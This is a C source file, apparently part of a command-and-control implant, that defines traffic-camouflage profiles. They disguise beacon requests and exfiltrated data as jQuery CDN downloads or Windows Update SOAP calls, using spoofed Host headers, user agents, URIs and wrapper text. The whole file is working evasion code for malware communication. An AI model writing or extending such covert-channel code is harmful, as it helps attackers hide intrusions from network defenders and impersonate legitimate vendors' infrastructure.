/*
 * profile.c - Implémentation des profils malléables
 */

#include "profile.h"
#include "../utils/memory.h"
#include "../utils/strings.h"

/* Default profile */
static const char *DEFAULT_GET_URIS[] = {"/api/get", "/check", "/status"};

static const char *DEFAULT_POST_URIS[] = {"/api/post", "/update", "/submit"};

static const char *DEFAULT_HEADERS[] = {"Accept: */*",
                                        "Accept-Language: en-US,en;q=0.9"};

const malleable_profile_t PROFILE_DEFAULT = {
    .get_uris = DEFAULT_GET_URIS,
    .get_uri_count = 3,
    .post_uris = DEFAULT_POST_URIS,
    .post_uri_count = 3,
    .headers = DEFAULT_HEADERS,
    .header_count = 2,
    .prepend = NULL,
    .append = NULL,
    .user_agent =
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"};

/* jQuery profile - mimics CDN traffic */
static const char *JQUERY_GET_URIS[] = {
    "/jquery-3.6.0.min.js", "/jquery-3.6.0.slim.min.js", "/jquery-ui.min.js",
    "/jquery.validate.min.js"};

static const char *JQUERY_POST_URIS[] = {"/api/analytics", "/api/metrics",
                                         "/api/track"};

static const char *JQUERY_HEADERS[] = {
    "Accept: application/javascript, */*;q=0.8",
    "Accept-Language: en-US,en;q=0.5", "Accept-Encoding: gzip, deflate",
    "Host: code.jquery.com", "Referer: https://jquery.com/"};

const malleable_profile_t PROFILE_JQUERY = {
    .get_uris = JQUERY_GET_URIS,
    .get_uri_count = 4,
    .post_uris = JQUERY_POST_URIS,
    .post_uri_count = 3,
    .headers = JQUERY_HEADERS,
    .header_count = 5,
    .prepend =
        "/*! jQuery v3.6.0 | (c) OpenJS Foundation | jquery.org/license */\n",
    .append = "\n//# sourceMappingURL=jquery.min.map",
    .user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) "
                  "Gecko/20100101 Firefox/115.0"};

/* Microsoft profile - mimics Windows Update traffic */
static const char *MS_GET_URIS[] = {
    "/v9/windowsupdate/redir/wuredir.cab",
    "/v9/windowsupdate/selfupdate/WSUS3.0/x64/UpdateServices.cab",
    "/msdownload/update/v3/static/trustedr/en/authrootstl.cab"};

static const char *MS_POST_URIS[] = {
    "/v9/windowsupdate/clientwebservice/client.asmx",
    "/v6/windowsupdate/dsds/dsds.asmx",
    "/reportingwebservice/reportingwebservice.asmx"};

static const char *MS_HEADERS[] = {
    "Accept: */*", "Accept-Encoding: gzip, deflate, br",
    "Host: update.microsoft.com", "Connection: keep-alive"};

const malleable_profile_t PROFILE_MICROSOFT = {
    .get_uris = MS_GET_URIS,
    .get_uri_count = 3,
    .post_uris = MS_POST_URIS,
    .post_uri_count = 3,
    .headers = MS_HEADERS,
    .header_count = 4,
    .prepend = "<?xml version=\"1.0\" "
               "encoding=\"utf-8\"?>\n<soap:Envelope>\n<soap:Body>\n<Data>",
    .append = "</Data>\n</soap:Body>\n</soap:Envelope>",
    .user_agent = "Windows-Update-Agent/10.0.19041.1 Client-Protocol/1.40"};

/* Global state */
static const malleable_profile_t *g_active_profile = &PROFILE_DEFAULT;

/* Implementation */

const malleable_profile_t *profile_get_active(void) { return g_active_profile; }

void profile_set_active(const malleable_profile_t *profile) {
  if (profile) {
    g_active_profile = profile;
  }
}

const char *profile_get_random_uri(void) {
  if (!g_active_profile || g_active_profile->get_uri_count <= 0) {
    return "/";
  }

  /* Simple random */
  LARGE_INTEGER counter;
  QueryPerformanceCounter(&counter);
  int idx = counter.LowPart % g_active_profile->get_uri_count;

  return g_active_profile->get_uris[idx];
}

const char *profile_post_random_uri(void) {
  if (!g_active_profile || g_active_profile->post_uri_count <= 0) {
    return "/";
  }

  LARGE_INTEGER counter;
  QueryPerformanceCounter(&counter);
  int idx = counter.LowPart % g_active_profile->post_uri_count;

  return g_active_profile->post_uris[idx];
}

char *profile_transform_data(const char *data) {
  if (!data)
    return NULL;

  const char *prepend =
      g_active_profile->prepend ? g_active_profile->prepend : "";
  const char *append = g_active_profile->append ? g_active_profile->append : "";

  size_t prepend_len = strlen(prepend);
  size_t data_len = strlen(data);
  size_t append_len = strlen(append);

  char *result = (char *)malloc(prepend_len + data_len + append_len + 1);
  if (!result)
    return NULL;

  memcpy(result, prepend, prepend_len);
  memcpy(result + prepend_len, data, data_len);
  memcpy(result + prepend_len + data_len, append, append_len);
  result[prepend_len + data_len + append_len] = '\0';

  return result;
}

char *profile_untransform_data(const char *data, size_t len) {
  if (!data || len == 0)
    return NULL;

  const char *prepend =
      g_active_profile->prepend ? g_active_profile->prepend : "";
  const char *append = g_active_profile->append ? g_active_profile->append : "";

  size_t prepend_len = strlen(prepend);
  size_t append_len = strlen(append);

  /* Vérifie que les données commencent/finissent avec le bon wrapper */
  if (len < prepend_len + append_len) {
    return str_dup(data); /* Pas de transformation */
  }

  /* Extrait les vraies données */
  size_t real_len = len - prepend_len - append_len;
  char *result = (char *)malloc(real_len + 1);
  if (!result)
    return NULL;

  memcpy(result, data + prepend_len, real_len);
  result[real_len] = '\0';

  return result;
}
